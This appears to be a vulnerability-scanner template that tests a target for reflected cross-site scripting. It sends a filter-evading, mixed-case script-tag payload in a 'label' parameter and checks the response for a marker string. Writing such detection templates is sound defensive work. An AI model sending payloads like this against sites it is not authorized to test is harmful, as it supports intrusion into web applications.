id: xss5-0314
name: 'Raw XSS5 in label'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in label'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      label:
        - '<ScRiPt%0a>alert(nx50313)</ScRiPt>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx50313'
